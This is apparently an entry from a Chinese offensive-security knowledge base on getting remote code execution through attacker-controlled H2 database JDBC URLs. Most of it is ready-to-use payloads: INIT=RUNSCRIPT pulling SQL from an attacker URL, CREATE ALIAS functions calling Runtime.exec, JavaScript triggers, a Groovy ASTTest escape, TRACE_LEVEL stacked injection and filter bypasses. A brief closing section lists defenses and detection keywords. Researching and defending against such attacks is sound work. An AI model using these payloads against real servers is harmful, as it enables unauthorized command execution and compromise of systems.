---
id: web-java-component-h2-init-single-statement-trace-stacked-alias-groovy
title: H2 的 INIT 只能执行一条语句：出网用 RUNSCRIPT 拉远程 SQL，不出网用 CREATE ALIAS/JS 触发器，INIT 被过滤时改打 TRACE_LEVEL_* 的堆叠执行
type: scenario
domain: web
path: web/java/component
technique: h2-init-single-statement-runaround-trace-stacked
aliases:
- H2 INIT 单条语句限制
- RUNSCRIPT FROM 远程 SQL
- CREATE ALIAS 定义 Java 函数
- //javascript 触发器
- TRACE_LEVEL_SYSTEM_OUT 堆叠注入
- groovy ASTTest 逃逸
tags:
- java
- h2
- jdbc
- rce
- runscript
- create-alias
- stacked-query
- groovy
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:58:00+08:00'
  notes: 已对照原文核对；本次核对未读取图片；INIT=RUNSCRIPT FROM 远程 poc.sql、poc.sql 的 CREATE ALIAS shell AS $$...$$ 与 SELECT shell(...)、//javascript 触发器、TRACE_LEVEL_SYSTEM_OUT=1\;CREATE TRIGGER 堆叠、groovy ASTTest、SHELLEXEC+Scanner 回显写法均与正文示例一致；正文也明确 INIT 只能一条语句且分号需转义、-webAllowOthers/-ifNotExists 前提；原文未给 H2 受影响版本区间（1.4.200 与 2.3.232 为复现环境），未设 versions；PoC 未对真实目标执行
---

## 一句话结论

可控 H2 JDBC URL 时，`INIT=` 会执行一条 SQL，这是最直接的入口；但它只能执行**一条**语句、且不能含未转义分号。于是打法是三选一：能出网就用 `INIT=RUNSCRIPT FROM 'http://attacker/poc.sql'` 把多条语句搬到远程脚本里；不出网就用 `INIT=CREATE ALIAS ... AS $$ Java 源码 $$` 定义函数再 `CALL`，或用 `//javascript` 触发器（依赖 JDK 有 JS 引擎）、`CREATE ALIAS ... AS $$@groovy.transform.ASTTest(...)$$`（依赖 classpath 有 groovy）；如果 `INIT` 本身被过滤，则改打 `TRACE_LEVEL_SYSTEM_OUT`/`TRACE_LEVEL_FILE`/`TRACE_MAX_FILE_SIZE`——这些属性同样接受任意 SQL 片段，用 `\;` 转义分号即可堆叠出 `CREATE TRIGGER ... AS $$//javascript ...$$` 完成执行。

## 原理

- **`INIT` 的语义与限制**：H2 在 `Engine.createSession` 阶段取 `init` 属性，非空则 `prepareLocal(init)` + `executeUpdate`，只执行这一条语句；`Parser` 先 tokenize 再按关键字分派（如 `RUNSCRIPT` → `RuntimeScriptCommand.update`），语义上不支持多语句。
- **`RUNSCRIPT FROM '<url>'` 把“一条”变“多条”**：`RunScriptCommand.update` 会循环执行从远程/本地文件读到的每条 SQL，于是把 `CREATE ALIAS` + `CALL` 写进远程 `poc.sql` 即可；`$$...$$` 是 H2 定义 Java 函数的语法（两个 `$` 之间是方法体源码）。
- **不出网的三条路**：
  1. `CREATE ALIAS shell AS $$void shell(String s) throws Exception { Runtime.getRuntime().exec(s); }$$`（H2 1.4.x 常见）；
  2. `//javascript` 触发器：`CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS '//javascript Java.type("java.lang.Runtime").getRuntime().exec("calc")'`，依赖 JDK 自带 JS 引擎（Nashorn/GraalJS）；
  3. groovy `ASTTest`：`CREATE ALIAS shell2 AS $$@groovy.transform.ASTTest(value={ assert Runtime.getRuntime().exec("cmd /c calc") }) def x$$`，依赖 `groovy-sql` 在 classpath。
- **`INIT` 被过滤时的替代触发点**：`TRACE_LEVEL_SYSTEM_OUT`、`TRACE_LEVEL_FILE`、`TRACE_MAX_FILE_SIZE` 这些 profiling 属性在解析时也会把值当 SQL 片段处理，且允许 `\;` 转义分号，因此可堆叠出 `CREATE TRIGGER ... AS $$//javascript ...$$--`。
- **有回显的写法**：`CREATE ALIAS SHELLEXEC AS $$String shellexec(String cmd) ... new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())...$$; CALL SHELLEXEC('whoami');`，用 Scanner 读命令输出。
- **为什么 H2 特别危险**：H2 是内嵌数据库，console 可整合进 Spring Boot 也可独立起 WebServer；`-webAllowOthers` 让外部能连、`-ifNotExists` 让不存在的库也能建，两者一开，JDBC URL 就是远程代码执行入口。

## 触发条件

- 目标 classpath 有 H2 驱动，且用户可控 JDBC URL 或 H2 Console 登录参数（驱动名、URL 都由表单提交）。
- 目标允许创建/连接数据库（`-ifNotExists`、或库已存在），且 `INIT` 未被解析后语义校验拦掉。
- 出网场景需目标能访问攻击者的 SQL 文件地址；不出网场景需 JDK 带 JS 引擎或 classpath 有 groovy。
- H2 版本决定可用语法（2.x 对 `INIT`/`CREATE ALIAS` 限制更严，`//javascript` 在无 JS 引擎的 JDK15+ 失效）。

## 利用步骤

1. 确认 URL 可控并能建连（H2 Console 表单、数据源测试、监控模板等），观察报错判断 H2 版本。
2. 出网优先：写 `poc.sql`（`CREATE ALIAS` + `CALL`），用 `jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker/poc.sql'` 连接。
3. 不出网：直接把 `CREATE ALIAS shell AS $$...Runtime.getRuntime().exec(s)...$$` 塞进 `INIT`，再用一次连接执行 `CALL shell('cmd')`（或用 `//javascript` 触发器在插入 `INFORMATION_SCHEMA.TABLES` 时触发）。
4. `INIT` 被过滤：改用 `;TRACE_LEVEL_SYSTEM_OUT=1\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript Java.type("java.lang.Runtime").getRuntime().exec("calc")$$--`。
5. 有回显需求时用 `SHELLEXEC` + `Scanner` 版本，把结果通过 `CALL` 的返回值带回。
6. 若 `$$` 里不能有分号（URL 分割导致），用 `\;` 转义；若 H2 2.x 拒绝 `CREATE ALIAS` 源码，尝试 groovy `ASTTest` 或退回 `RUNSCRIPT`。

## PoC

```sql
-- 远程 poc.sql（出网）
DROP ALIAS IF EXISTS shell;
CREATE ALIAS shell AS $$void shell(String s) throws Exception {
    java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT shell('cmd /c calc');
```

```text
# 出网：一条 INIT 拉起远程多语句
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'

# 不出网：单条 CREATE ALIAS
jdbc:h2:mem:test;init=CREATE ALIAS SHELL AS $$void sh(String s) throws Exception { Runtime.getRuntime().exec(s); }$$

# 不出网：JS 触发器
jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS '//javascript
Java.type("java.lang.Runtime").getRuntime().exec("calc")'

# INIT 被过滤：用 TRACE_LEVEL 堆叠（分号用 \; 转义）
jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=1\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
Java.type("java.lang.Runtime").getRuntime().exec("calc")$$--
```

```sql
-- 有回显
CREATE ALIAS SHELLEXEC AS $$String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}$$;
CALL SHELLEXEC('whoami');
```

说明：PoC 按原文两版 payload（1.4.200 与 2.3.232 环境）整理，未对真实目标执行；`\$` 在 URL 中的转义需按实际提交方式处理（原文用 `INIT=...` 与 `TRACE_LEVEL_...\;` 两种）。

## 变体与关联

- **建库前置**：`-ifNotExists` 未开或库不存在时，先用 `jdbc:derby/h2:...;create=true` 或 `ifExists` 参数把库建出来，再打 `INIT`；H2 1.4.198 后被 `FORBID_CREATION=TRUE` 追加补丁挡住的场景见关联卡。
- **过滤绕过变体**：`IN\IT`/`RUN\SCRIPT`（反斜杠转义）、`jdbc:h2://mem/testdb`（满足 `://` 正则）、U+00A0 替代空格（见关联卡）；`TRACE_LEVEL_*` 堆叠是“换触发属性”而非“换关键字”。
- **类加载变体**：`CREATE ALIAS ... AS $$ `<Java 源码>` $$`、`//javascript`、groovy `ASTTest`、`CREATE TRIGGER`、`LINKED TABLE`/`CSVREAD`（读文件）。
- **关联**：`web-java-component-h2-jdbc-url-filter-bypass-runscript`（`IN\IT` + `jdbc:h2://` + NBSP 的过滤绕过）、`web-java-component-h2-cve-2022-23221-forbid-creation-bypass-init-rce`（`AUTHZPWD=\` 吞掉 FORBID_CREATION）、`web-java-component-h2-jre-only-create-alias-static-method-rce`（无 JS 引擎时的 CREATE ALIAS 纯 JDK 方案）、`web-java-component-h2-console-postgres-loggerfile-ascii-jar-spring-xml-rce`（H2 Console 未授权 + 另一条链）。
- **边界**：H2 2.x 对 `CREATE ALIAS` 的 Java 源码与 `INIT` 限制更严；JDK 15+ 无 Nashorn 时 `//javascript` 失效；`INIT`/`TRACE_LEVEL_*` 被解析后白名单拦截、或目标不加载 H2 驱动时不成立。

## 检测与防御

- **入口**：数据源测试/控制台只允许白名单驱动与白名单 URL；禁止用户指定 `INIT`、`TRACE_LEVEL_*`、`RUNSCRIPT`、`CREATE ALIAS`、`CREATE TRIGGER`。
- **H2 Console**：不要 `-webAllowOthers`、不要 `-ifNotExists`；必须加认证并仅监听 127.0.0.1。
- **版本**：升级 H2 并按公告关闭危险特性（2.x 的 `-ifNotExists` 语义变化、`CREATE ALIAS` 限制）。
- **运行时**：JDK 升级到无 Nashorn 版本、移除 groovy 依赖；`java` 进程禁止创建子进程（seccomp/容器策略）。
- **检测**：JDBC URL 出现 `INIT=`、`RUNSCRIPT`、`CREATE ALIAS`、`CREATE TRIGGER`、`//javascript`、`TRACE_LEVEL_`、`\;`；H2 进程外连攻击者 HTTP（拉取 `poc.sql`）；异常 `Runtime.exec`/子进程；H2 Console 登录表单出现非 `jdbc:h2:` 的驱动或异常 URL。
